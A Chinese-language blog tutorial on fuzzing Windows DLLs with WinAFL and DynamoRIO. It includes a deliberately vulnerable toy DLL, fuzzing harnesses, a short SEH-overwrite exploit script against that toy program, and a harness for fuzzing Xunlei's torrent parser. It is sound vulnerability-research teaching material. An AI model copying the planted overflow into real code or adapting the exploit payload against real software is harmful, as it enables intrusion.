<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【漏洞挖掘】win-afl使用指北-中级篇</title><meta name="description" content="&lt;p&gt;为什么不叫高级篇，因为高级的我也不会&lt;/p&gt;
&lt;p&gt;主要讲一下更贴近实际的用法吧&lt;/p&gt;
&lt;p&gt;!!!仅大标题1完成，全片未完待续!!!&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【漏洞挖掘】win-afl使用指北-中级篇</h3><div class="article__date metadata"><div class="post-info">2023/07/19</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/CVE/">CVE</a><a class="article__tags__link metadata" href="/tags/fuzz/">fuzz</a></div><div class="article__body"><p>为什么不叫高级篇，因为高级的我也不会</p>
<p>主要讲一下更贴近实际的用法吧</p>
<p>!!!仅大标题1完成，全片未完待续!!!</p>
<span id="more"></span>
<h1 id="对dll进行fuzz"><a class="markdownIt-Anchor" href="#对dll进行fuzz"></a> 对DLL进行Fuzz</h1>
<h2 id="理论测试"><a class="markdownIt-Anchor" href="#理论测试"></a> 理论测试</h2>
<p>代码还是上一篇提到的代码，依旧是32位，只不过溢出部分写在DLL里面</p>
<p><code>dll.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">	str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o mydll.dll dll.c</span><br></pre></td></tr></table></figure>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllimport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	vuln(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c mydll.dll</span><br></pre></td></tr></table></figure>
<p>不想联合编译的话也可以使用<code>GetProAddress</code>来编写如下harness</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(__cdecl *pvuln)</span><span class="params">(<span class="type">char</span>* aFileName)</span>;</span><br><span class="line">pvuln vuln = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> mydll_path[] = <span class="string">&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\dll\\mydll.dll&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">	hMyDLL = LoadLibraryA(mydll_path);</span><br><span class="line">	<span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> END;</span><br><span class="line">	&#125;</span><br><span class="line">	vuln = (pvuln)GetProcAddress(hMyDLL,<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(vuln == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> END;</span><br><span class="line">	&#125;</span><br><span class="line">	vuln(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	<span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line">		FreeLibrary(hMyDLL);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开始插桩看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-debug ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">main.exe .\in\password.txt</span><br></pre></td></tr></table></figure>
<p>开始fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">main.exe @@</span><br></pre></td></tr></table></figure>
<p>瞬间找到crash</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p>
<p>样本长这样</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p>
<p>这次尝试使用x32dbg分析</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p>
<p>得到EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xEA\x23\x40\x00&quot;</span>    <span class="comment">#004023EA</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span>	<span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p>
<p>要点就是：<strong>Fuzz的时候和插桩的时候加上<code>-coverage_module &lt;你的dll&gt;</code></strong></p>
<h2 id="实际测试"><a class="markdownIt-Anchor" href="#实际测试"></a> 实际测试</h2>
<p>你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265958.htm">使用winafl对迅雷的torrent解析逻辑进行fuzz </a></p>
<p>首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用<code>ProcessMonitor</code>查看（俗称<code>procmon</code>），截图没有，特征就是当你打开一个<code>.torrent</code>文件后，<code>thunder.exe</code>会马上加载<code>AssisstantTools.dll</code>。通过查看导出表可以找到一些可以测试的函数，这里我测试的是<code>XL_ParseTorrentFile</code></p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" />
<p>查看导入表可以看到依赖的<code>P2PBase.dll</code></p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" />
<p>所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢，<br />
原文文章中的harness由于<code>using</code>附近的代码只在<code>c++11</code>中支持，所以使用gcc编译报错的可以尝试加上<code>-std=c++11</code><br />
如果你使用的是下面我编写的harness，那么直接编译就可以了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ParseTorrentFile)</span><span class="params">(CHAR* aFileName, PVOID* a1)</span></span>;</span><br><span class="line">pXL_ParseTorrentFile XL_ParseTorrentFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ReleaseTorrentFileInfo)</span><span class="params">(PVOID a1)</span></span>;</span><br><span class="line">pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">fuzz_method</span><span class="params">(<span class="type">char</span> *FilePath)</span></span>&#123;</span><br><span class="line">    PVOID a1 = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">XL_ParseTorrentFile</span>(FilePath, &amp;a1);</span><br><span class="line">    <span class="keyword">if</span> (a1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">XL_ReleaseTorrentFileInfo</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//char AssisstantToolsPath[] = &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\a.dll&quot;;</span></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">	hMyDLL = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;AssistantTools.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> END;</span><br><span class="line">	&#125;</span><br><span class="line">	XL_ParseTorrentFile = (pXL_ParseTorrentFile)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ParseTorrentFile&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(XL_ParseTorrentFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> END;</span><br><span class="line">	&#125;</span><br><span class="line">	XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ReleaseTorrentFileInfo&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(XL_ReleaseTorrentFileInfo == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fuzz_method</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	<span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line">		<span class="built_in">FreeLibrary</span>(hMyDLL);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可以用<code>drrun -t drcov --</code>来测试看是不是使用成功，之后使用<code>drrun</code>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe&quot; ^</span><br><span class="line">-c winafl.dll -debug ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_offset 0x11ef ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 ^</span><br><span class="line">-- fuzz_program.exe &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>问题1：</strong></p>
<p>如果你使用的<code>Dynamorio</code>是大于 <strong>8.0.0-1</strong>版本的，很大概率会出现错误类似于下面</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" />
<p>这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在<code>dynamorio</code>中的harness崩溃了，所以程序还没有进入<code>entry</code>入口点函数就直接寄了。这个错误很有意思，加载类似<code>ntdll.dll</code>或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的<code>LoadLibrary</code>载入其他DLL的时候（比如某个软件的<code>ffmpeg.dll</code>）也会报错。<br />
这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子</p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274169.htm">https://bbs.kanxue.com/thread-274169.htm</a></p>
<p><strong>最后我的解决方法是更换到dynamorio 8.0.0-1版本过后重新编译就行了</strong></p>
</li>
<li>
<p><strong>问题2：</strong></p>
<p>当你使用<code>target_method</code>的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上<code>extern &quot;C&quot; __declspec(dllexport)</code>就行了</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" />
</li>
</ul>
<p>首先就是缩减testcase</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\winafl-cmin.py&quot; --working-dir &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release&quot; -D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; -t 9000 -i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin&quot; -o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ </span><br></pre></td></tr></table></figure>
<p>然后开始fuzz，开启一个Master吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 9000 -- ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_method fuzz_method ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">fuzz_program.exe @@</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>-M</code>: 指定这是一个Master进程</p>
</li>
<li>
<p><code>-i -</code>：当fuzz暂停的时候恢复，在AFL上是<code>-in -</code>，具体用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i -&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p>
<p>自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" />
<p>也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO）</p>
<p>昨天16h高强度修复问题1，暂时更新到这里</p>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/22/afl-source/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/18/win-afl/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>